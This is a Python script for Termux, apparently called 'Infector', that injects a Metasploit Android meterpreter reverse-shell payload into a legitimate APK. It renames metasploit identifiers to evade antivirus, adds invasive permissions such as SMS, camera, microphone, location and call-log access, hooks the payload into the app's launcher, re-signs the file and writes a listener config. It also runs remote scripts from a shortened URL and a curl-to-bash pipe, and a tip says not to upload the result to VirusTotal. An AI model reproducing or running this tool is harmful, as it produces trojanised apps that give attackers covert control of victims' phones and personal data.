#!$TERMUX_PREFIX/usr/bin/env python3
# -*- coding: UTF-8 -*-
#
#
#  Copyright 2021 TDynamos <tdynamos@linux>
#
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.
#
# If you want credits in this code then see your face idiot
# Don't try to copy the code . In code there is a online command that is exeuted to keep it safe

version = '4.0'
import re
import os
import sys
import subprocess
import fnmatch
import random
try:
	from colorama import Fore,Back,Style
except Exceptation:
	os.system('pip install colorama')
from colorama import Fore,Back,Style
R = Fore.RED
B = Fore.BLUE
G = Fore.GREEN
C = Fore.CYAN
Y  = Fore.YELLOW
M = Fore.MAGENTA
W = Fore.WHITE
print(Style.BRIGHT)
pwd=os.getcwd()
def syst():
	linux = os.path.isfile('/usr/bin/env')
	win = os.path.isfile('C:')
	termux = os.path.isfile('/data/data/com.termux/files/home')
def tip():
	tip1 =(f'  {R}> This is specifically made for termux')
	tip2 = (f'  {R}> You can test it on linux but dependices are not supported')
	tip3 = (f'  {R}> You should choose small apk file')
	tip4 = (f'  {R}> You should not try it at famous apps like facebook')
	tip5 = (f'  {R}> If any error comes feel free to open issue on github')
	tip6 = (f'  {R}> You should not sumbit the apk to {G} Virustotal.com')
	tip7 = (f'  {R}> Contribute to this tool by suggesting ideas')
	tip8 = (f'  {R}> Subscribe {G}Noob hackers{R} for latest tool release and updates')
	haa = random.randint(1,8)
	if haa == 1:
		print(tip1)
	if haa == 2:
		print(tip2)
	if haa == 3:
		print(tip3)
	if haa == 4:
		print(tip4)
	if haa == 5:
		print(tip5)
	if haa == 6:
		print(tip6)
	if haa == 7:
		print(tip7)
	if haa == 8:
		print(tip8)
		
	
BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
con = f"""
{C}╔══════════════════════════════════════════════╗
║ {G}Ansh       = {B}github.com/T_dynamos            {C}║
║ {G}Baapg      = {B}github.com/Vertlee              {C}║
║ {G}Nitro      = {B}github.com/noob-hackers         {C}║
║ {G}Pushpander = {B}github.com/Pushpanderindia      {C}║
║ {G}S.V Group  = {B}github.com/omkar                {C}║
{C}╚══════════════════════════════════════════════╝
    {Fore.WHITE+Back.LIGHTBLACK_EX} MADE BY COMMUNITY , MADE FOR COMMUNITY {Back.RESET}""" 
logo = f"""
      %s ______________%s     :           :
|  %s   ║              ║   %s ';,.-----.,;'    
%s[%s]%s----%s║%s  Metasploit  %s║%s==>%s  / 0     0 \ 
|  %s   ║______________║    %s/           \  
                         [%s═════════════%s]   
                                                         
   █ █▄░█ █▀▀ █▀▀ █▀▀ ▀█▀ █▀█ █▀█ %sv{version}
 %s  █ █░▀█ █▀░ ██▄ █▄▄ ░█░ █▄█ █▀▄"""%(C,G,C,G,Y,Y,C,C,B+Back.WHITE,Back.RESET+C,C,G,C,G,Fore.WHITE,G,M,
 G)
 

msf78 = os.path.isfile('/data/data/com.termux/files/home/metasploit-framework/msfvenom')
if msf78 == True:
	os.system('ln -s /data/data/com.termux/files/home/metasploit-framework/msfvenom $PREFIX/bin/msfvenom > /dev/null 2&>1')
else:
	pass
import requests
def ver_check():
	print( R+"["+G+">"+R+"] "+C+'Checking for Updates...',end='')
	ver_url = 'https://raw.githubusercontent.com/T-Dynamos/Infector/main/.version'
	try:
		ver_rqst = requests.get(ver_url)
		ver_sc = ver_rqst.status_code
		if ver_sc == 200:
			github_ver = float(str(ver_rqst.text)[:-1])
			if float(version) == github_ver:
				print(C + '[' + G + ' Up-To-Date ' + C +']' + '\n')
			else:
				print(C + '[' + G + ' Available : {} '.format(github_ver) + C + ']' + '\n')
		else:
			print(C + '[' + R + ' Status : {} '.format(ver_sc) + C + ']' + '\n')
	except Exception as e:
		print('\n'+ R + '[-]' + str(e)+ ' Exception : ' + W + 'No internet')

def check():
    syst()
    print(Back.RESET+logo)
    print()
    tip()
    print()
    ver_check()
    print(f"{con+Y}\n\n{Y}")
    head("Checking for Dependencies \n")
    print(f"{YELLOW}\n[*] Checking : APKTool")
    apktool = os.system("which apktool > /dev/null")
    if apktool == 0:
        print(f"{GREEN}[+] APKTool - OK")
    else:
        print(f"{RED}[!] APKTool - 404 NOT FOUND !")
        apktool_install = input(f"{BLUE}\n[?] What to Install It Now ? (y/n) : ")
        if apktool_install.lower() == "y":
            linux = os.path.isfile('/usr/bin/env')
            if linux == True:
            	os.system('apt install apktool')
            	return check()
            else:
            	pass
            os.system("apt-get install curl -y")
            os.system("curl -l https://raw.githubusercontent.com/rendiix/termux-apktool/main/install.sh | bash ")
            return check()
                    
    print(f"{YELLOW}\n[*] Checking : Jarsigner")
    jarsigner = os.system("which jarsigner > /dev/null")
    if jarsigner == 0:
        print(f"{GREEN}[+] Jarsigner - OK")
    else:
        print(f"{RED}[!] Jarsigner - 404 NOT FOUND !")
        jarsigner_install = input(f"{BLUE}\n[?] What to Install It Now ? (y/n) : {WHITE}")
        if jarsigner_install.lower() == "y":
            os.system("apt-get update")
            os.system("apt-get install openjdk-17 -y ")
            return check()


    print(f"{YELLOW}\n[*] Checking : APKsigner")
    apksigner = os.system("which apksigner > /dev/null")
    if apksigner == 0:
        print(f"{GREEN}[+] APKsigner - OK")
    else:
        print(f"{RED}[!] APKsigner - 404 NOT FOUND !")
        jarsigner_install = input(f"{BLUE}\n[?] What to Install It Now ? (y/n) : {WHITE}")
        if jarsigner_install.lower() == "y":
            os.system("apt-get update")
            os.system("apt-get install apksigner -y ")
            return check()
       
    print(f"{YELLOW}\n[*] Checking : ZipAlign")
    zipalign = os.system("which zipalign > /dev/null")
    if zipalign == 0:
        print(f"{GREEN}[+] ZipAlign - OK")
    else:
        print(f"{RED}[!] ZipAlign- 404 NOT FOUND !")
        jarsigner_install = input(f"{BLUE}\n[?] What to Install It Now ? (y/n) : {WHITE}")
        if jarsigner_install.lower() == "y":
            os.system("apt-get update")
            os.system("apt-get install aapt -y ")
            return check()
    print(f"{YELLOW}\n[*] Checking : Metasploit")
    zipalign = os.system("which msfvenom > /dev/null")
    if zipalign == 0:
        print(f"{GREEN}[+] Metasploit - OK")
    else:
        print(f"{RED}[!] Metasploit - 404 NOT FOUND !")
        jarsigner_install = input(f"{BLUE}\n[?] What to Install It Now ? (y/n) : {WHITE}")
        if jarsigner_install.lower() == "y":
            os.system("apt-get update")
            os.system("apt install wget -y")
            os.system("wget https://kutt.it/WG81ae -O ins.sh")
            os.system("bash ins.sh && msf_ins")
            return check()

def pay_type():
    
    print(Fore.WHITE,""" 
    ====================================    
    [*] Available Types of Payload
    ====================================
    (1) android/meterpreter/reverse_tcp
    (2) android/meterpreter/reverse_http    
    (3) android/meterpreter/reverse_https\n""")
    payload_type = str((input(f"{BLUE+Style.BRIGHT}[{W}?{B}] Which Type of Payload, You Want to Create (1/2/3): ")))
    if payload_type == '1':
        type_of_payload = "android/meterpreter/reverse_tcp" 
    elif payload_type == '2':
        type_of_payload = "android/meterpreter/reverse_http"
    elif payload_type == '3':
        type_of_payload = "android/meterpreter/reverse_https"
    else:
        error("Wrong Option")
        print()
        res()
    print()
    lhost = (input(Fore.CYAN+"> Enter the LHOST = "+Fore.GREEN))
    print()
    lport = (input(Fore.CYAN+"> Enter the LPORT = "+G))
    print()
    pathiapk = (input(Fore.CYAN+"> Enter the Location of Original Apk  = "+G))
    check1 = os.path.isfile(pathiapk)
    if check1 == True:
    	pass
    else:
    	error(" File Not Found")
    	print()
    	res()
    	exit()
    	print()
    print()
    pathoapk = (input(Fore.CYAN+"> Enter the Output Path = "+G))
    print()
    head("Creating Payload...")
    print(G)
    qwe = os.path.isfile('android_payload.apk')
    if qwe == True:
    	os.system('rm android_payload.apk > /dev/null 2&>1 ')
    	pass
    else:
    	os.system(f"msfvenom -p {type_of_payload} LHOST={lhost} LPORT={lport} > android_payload.apk") 
    if os.path.exists("android_payload.apk"):
    	head(" Payload Created Successfully !")
    choice_handler = input(f"\n{BLUE}[{W}?{B}] Want to Create msfconsole handler.rc file (y/n): ")
    if choice_handler.lower() == 'y':
        print(f"{YELLOW}\n[*] Creating handler.rc")
        if os.path.exists("handler.rc"):
            os.system("rm handler.rc")
            pass
        handler=open("handler.rc","w")
        handler.write("use exploit/multi/handler\n")
        handler.write(f"set {type_of_payload}\n")
        handler.write(f"set LHOST {lhost}\n")
        handler.write(f"set LPORT {lport}\n")
        handler.write("exploit -j")
        handler.close()
        head(f"{GREEN} Created Successfully : {pwd}/handler.rc")        
    print()
    head("Decompiling  the Original Apk")
    print(G+"\n")
    os.system("rm -rf normal_apk > /dev/null 2&>1")
    decompile_normal_apk = os.system("apktool d "+pathiapk+" -o normal_apk ")
    if decompile_normal_apk == 0:
        print(f"{GREEN} Decompiled Successfully !")
    else:
        error(f"{RED} Failed to Decompile Normal/Legitimate APK")
        print()
        res()
    print()
    head("Decompiling Metasploit Payload")
    print(G)
    os.system("rm -rf android_payload ")
    decompile_evil_apk = os.system(f"apktool d -f android_payload.apk -o {pwd}/android_payload ")
    print()
    if decompile_normal_apk == 0:
        print(f"{GREEN} Decompiled Successfully !")
    else:
        error(f"{RED}Failed to Decompile Evil APK")
        print()
        res()
    print()
    head(f"{YELLOW}Generating Random Variables which will be used in Ofustication")
    VAR1 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True) # smali dir renaming
    VAR1 = str(VAR1.strip()).split('\'')[1]
    VAR2 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True) # smali dir renaming
    VAR2 = str(VAR2.strip()).split('\'')[1]
    VAR3 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True) # Payload.smali renaming
    VAR3 = str(VAR3.strip()).split('\'')[1]
    VAR4 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True) # Pakage name renaming 1 
    VAR4 = str(VAR4.strip()).split('\'')[1]
    VAR5 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True) # Pakage name renaming 2
    VAR5 = str(VAR5.strip()).split('\'')[1]
    VAR6 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True) # Pakage name renaming 3
    VAR6 = str(VAR6.strip()).split('\'')[1]
    VAR7 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True) # New name for word 'payload'
    VAR7 = str(VAR7.strip()).split('\'')[1]
    VAR8 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True) # New name for word 'metasploit'
    VAR8 = str(VAR8.strip()).split('\'')[1]
    apkName = {pathoapk}
    head(f"{YELLOW}Changing default folder and filenames being flagged by AV")
    os.system(f"mv {pwd}/android_payload/smali/com/metasploit {pwd}/android_payload/smali/com/{VAR1}")
    os.system(f"mv {pwd}/android_payload/smali/com/{VAR1}/stage {pwd}/android_payload/smali/com/{VAR1}/{VAR2}")
    os.system(f"mv {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/Payload.smali {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/{VAR3}.smali")
    os.system(f"sed -i \"s#/metasploit/stage#/{VAR1}/{VAR2}#g\" {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/*")
    os.system(f"sed -i \"s#Payload#{VAR3}#g\" {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/*")
    os.system(f"sed -i \"s#com.metasploit.meterpreter.AndroidMeterpreter#com.{VAR4}.{VAR5}.{VAR6}#\" {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/{VAR3}.smali")
    os.system(f"sed -i \"s#payload#{VAR7}#g\" {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/{VAR3}.smali")
    os.system(f"sed -i \"s#com.metasploit.stage#com.{VAR1}.{VAR2}#\" {pwd}/android_payload/AndroidManifest.xml")
    os.system(f"sed -i \"s#metasploit#{VAR8}#\" {pwd}/android_payload/AndroidManifest.xml")
    os.system(f"sed -i \"s#MainActivity#{apkName}#\" {pwd}/android_payload/res/values/strings.xml") 
    print()
    head("Done !!")
    print()  
    print(f"{YELLOW}\n[*] Moving Meterpreter Payload to Normal/Legitimate APK")
    moving_payload = os.system(f"mv {pwd}/android_payload/smali/com/{VAR1} {pwd}/normal_apk/smali/com/")
    os.system(f"rm -rf {pwd}/android_payload")
    if moving_payload == 0:
        print(f"{GREEN}[+] Moved Successfully!")
    else:
        print(f"{RED}[!] Failed to Move Evil Files to Normal/Legitimate APK")
    print()
    head("Adding Permissions in androidManifest.xml")
    permission_01 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.SET_WALLPAPER\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_02 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.INTERNET\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_03 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.ACCESS_WIFI_STATE\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_04 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.CHANGE_WIFI_STATE\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_05 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.ACCESS_NETWORK_STATE\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_06 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.ACCESS_COARSE_LOCATION\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_07 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.ACCESS_FINE_LOCATION\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_08 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.READ_PHONE_STATE\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_09 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.SEND_SMS\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_10 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.RECEIVE_SMS\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_11 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.RECORD_AUDIO\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_12 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.CALL_PHONE\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_13 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.READ_CONTACTS\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_14 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.WRITE_CONTACTS\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_15 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.RECORD_AUDIO\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_16 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.WRITE_SETTINGS\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_17 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.CAMERA\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_18 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.READ_SMS\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_19 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.WRITE_EXTERNAL_STORAGE\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_20 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.RECEIVE_BOOT_COMPLETED\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_21 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.READ_CALL_LOG\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_22 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.WRITE_CALL_LOG\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    permission_23 = f'sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\\"android.permission.WAKE_LOCK\\"/>" {pwd}/normal_apk/AndroidManifest.xml'

    permissions_list = [permission_01, permission_02, permission_03, permission_04, permission_05, permission_06, permission_07, permission_08, permission_09, permission_10, permission_11, permission_12, permission_13, permission_14, permission_15, permission_16, permission_17, permission_18, permission_19, permission_20, permission_21, permission_22, permission_23]
    
    random.shuffle(permissions_list)  # Shuffling Permission List
    for i in range(len(permissions_list)): 
        os.system(permissions_list[i])

    user_permission_1 = f'sed -i "/SET_WALLPAPER/a \    <uses-feature android:name=\\"android.hardware.camera\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    user_permission_2 = f'sed -i "/SET_WALLPAPER/a \    <uses-feature android:name=\\"android.hardware.camera.autofocus\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
    user_permission_3 = f'sed -i "/SET_WALLPAPER/a \    <uses-feature android:name=\\"android.hardware.microphone\\"/>" {pwd}/normal_apk/AndroidManifest.xml'
     
    user_permission_list = [user_permission_1, user_permission_2, user_permission_3]

    random.shuffle(user_permission_list)  # Shuffling USER Permission List
    for i in range(len(user_permission_list)): 
        os.system(user_permission_list[i])
    lines_seen = set() # holds lines already seen
    outfile = open(f"{pwd}/normal_apk/AndroidManifest_New.xml", "w")
    for line in open(f"{pwd}/normal_apk/AndroidManifest.xml", "r"):
        if line not in lines_seen: # not a duplicate
            outfile.write(line)
            lines_seen.add(line)
    outfile.close()
    #os.system(f"rm -r {pwd}/normal_apk/AndroidManifest.xml")
    #os.system(f"mv {pwd}/normal_apk/AndroidManifest_New.xml {pwd}/normal_apk/AndroidManifest.xml")

        
    head(f"{GREEN}Injected Successfully!")
    print()
    a = input(f'{Y}Do you want to change App Name [y/n] = {G}')
    if a == 'y':
    	 code2 =(f"""sed -n -e '/"app_name"/p' {pwd}/normal_apk/res/values/strings.xml > appnm && sed 's/^.*">//I;q' appnm > test1 && cut -f1 -d "<" test1 > flaps && cat flaps""")
    	 try:
    	 	haa = subprocess.check_output(code2,shell=True)
    	 except Exceptation:
    	 	print("This App name can't be changed !!")
    	 	exit()
    	 line = str(haa)
    	 st = str(line.replace("b'",""))
    	 s = st.replace("'","")
    	 print()
    	 head(f'Current App Name is : {C}{s[:-2]}')
    	 print()
    	 apnm = input(f"{Y}Enter the namr to be changed = {G}")
    	 codeha = (f"""sed -n -e '/"app_name"/p' {pwd}/normal_apk/res/values/strings.xml > appnm && sed 's/^.*">//I;q' appnm > test1 && cut -f1 -d "<" test1 > flaps && dft=$(cat flaps) && ctm='{apnm}' && sed -i "s|$dft|$ctm|g" {pwd}/normal_apk/res/values/strings.xml > dragon && cat dragon""")
    	 os.system(codeha)
    	 print()
    	 print(f'{G}Done !!')
    	 print()
    	 code3 =(f"""sed -n -e '/"app_name"/p' {pwd}/normal_apk/res/values/strings.xml > appnm && sed 's/^.*">//I;q' appnm > test1 && cut -f1 -d "<" test1 > flaps && cat flaps""")
    	 haa1 = subprocess.check_output(code3,shell=True)
    	 line = str(haa1)
    	 st = str(line.replace("b'",""))
    	 s = st.replace("'","")
    	 print(f"{B}Changed app name : {G}{s[:-2]}")
    	 print()
    else:
    	pass

    print()
    head("Finding smali launcher : MainActivity.smali")
    os.system('rm out ramp result twelv.txt > /dev/null 2&>1')
    code = """ codp=$(grep -o -m 1 "[A-z0-9].*\Activity" normal_apk/AndroidManifest.xml  > out) && trend=$(cat out) && cods=$(grep -o -i -m 1 ":name=.*\Activity" out > ramp && sed  's/^.*name="//I;q' ramp) && codz="$cods" && var=$(echo $codz) && new2="${var//.//}" && echo "$new2" > twelv.txt && awk '{print $0".smali"}' twelv.txt > result """
    os.system(code)
    line = subprocess.check_output("cat result",shell=True)
    f = open('result', 'r')
    line5 = f.read()
    line = str(line)
    st = str(line.replace("b'",""))
    s = st.replace("'","")
    launcherActivity = (pwd+"/normal_apk/smali/"+s[:-2]) 
    la = os.path.isfile(launcherActivity)
    if la == True:
    	pass
    else:
    	try:
    		trial = subprocess.check_output("""cat result | awk -F '"' '{print $1}'""",shell=True)
    		line = str(trial)
    		st = str(line.replace("b'",""))
    		s = st.replace("'","")
    		trial32 = str(os.getcwd())+"/normal_apk/smali/"+str(s)[:-2]+".smali"
    		trial2 = os.path.isfile(trial32)
    		if trial2 == True:
    			launcherActivity = trial32
    			pass
    		else:
    			path = str(pwd+"/normal_apk/smali_classes2/"+s[:-2])
    			if os.path.exists(path):
    				launcherActivity = path
    			else:
    				trial = subprocess.check_output("""cat result | awk -F '"' '{print $1}'""",shell=True)
    				line = str(trial)
    				st = str(line.replace("b'",""))
    				s = st.replace("'","")
    				trial32 = str(os.getcwd())+"/normal_apk/smali_classes2/"+str(s)[:-2]+".smali"
    				trial2 = os.path.isfile(trial32)
    				if trial2 == True:
    					launcherActivity = trial32
    				else:
    					error(' Unable to Locate smali launcher')
    					print(Y)
    					os.system('cat result')
    					print(G)
    					head(f"You can take help from above lines")
    					print()
    					launcherActivity = input(f"{G} Enter the path of launcher activity manually :(\n\n{B}==>{G}  ")				
    	except Exception as e :
    		print(e)
    		exit()
    print()
    print(f"{GREEN}[+] Path of MAIN/LAUNCHER .smali file: {WHITE}{launcherActivity}")
    print()
    head(f"{YELLOW} Hooking meterpreter payload")
    er = os.system("sed -i \"/method.*onCreate(/ainvoke-static {p0}, Lcom/"+VAR1+"/"+VAR2+"/"+VAR3+";->start(Landroid/content/Context;)V\" "+launcherActivity+"")
    if er ==0:
    	pass
    else:
    	error('Unable to Hook paylod ! . Reason was launcherActivity was not found ')
    	exit()
    print()
    head(f" Compiling Infected APK ")
    print()
    complie = os.system(f"apktool b {pwd}/normal_apk -o {pwd}/injected.apk")
    if complie == 0:
    	head(f"{GREEN} Compiled Successfully!")
    else:
    	error("Failed !!")
    	print()
    	print(f"{B}You can send us error screenshot")
    	exit()
    
    try:
        os.system("rm -rf ~/.android")
        os.system("mkdir ~/.android")
    except Exception:
        pass
    print()
    head(f"{YELLOW} Generating Key to Sign APK ")
    keytool = os.system("keytool -genkey -v -keystore ~/.android/debug.keystore -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000")
    if keytool == 0:
        print(f"{GREEN}[+] Key Generated Successfully!")
        
    choice_to_sign_apk = "J"
    if choice_to_sign_apk.lower() == "j":    
        head(f"{YELLOW}Trying to Sign APK Using Jarsigner")
        os.system(f"jarsigner -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA {pwd}/injected.apk androiddebugkey > /dev/null 2&>1")    
        print(f"{GREEN}[+] Signed the .apk file using {WHITE} ~/.android/debug.keystore")
    elif choice_to_sign_apk.lower() == "a":    
        head(f"{YELLOW}Trying to Sign APK Using APKsigner")
        os.system(f"apksigner sign --ks ~/.android/debug.keystore --ks-pass pass:android --in {pwd}/injected.apk > /dev/null 2&>1")    
        print(f"{GREEN}[+] Signed the .apk file using {WHITE} ~/.android/debug.keystore")
    head(f"{YELLOW}ZipAligning Signed APK\n")
    zipalign_apk = os.system(f"zipalign -v 4 {pwd}/injected.apk {pwd}/signed.apk")
    if zipalign_apk == 0:
        print(f"{GREEN}[+] ZipAligned APK Successfully!")
    os.system(f"mv {pwd}/signed.apk {pathoapk}")
    os.system(f"rm -rf {pwd}/normal_apk {pwd}/android_payload.apk {pwd}/injected.apk")
    print(f"{GREEN}[+] Output : {WHITE} {pathoapk}")
    os.system(f'termux-open {pathoapk} --send > /dev/null 2&>1')
    print("")
    head("Now you can start Metasploit ! . Enjoy 🙂")
def find(pattern, path):
    result = []
    for root, dirs, files in os.walk(path):
        for name in files:
            if fnmatch.fnmatch(name, pattern):
                result.append(os.path.join(root, name))
    return result       
def error(str):
	print()
	print(R+"E:"+Y+str)
os.system('clear')
		
def res():
	rresf=input(B+"Do you want to RESTART [y/n] = ")

	if rresf == "y":
		return main()
	else:
		exit()
def head(str):
	print(R+"["+G+">"+R+"] "+C+str)

def main():
	os.system("clear")
	check()
	print()
	head("All Dependices Were Found !!")
	print("\n")
	pay_type()
main()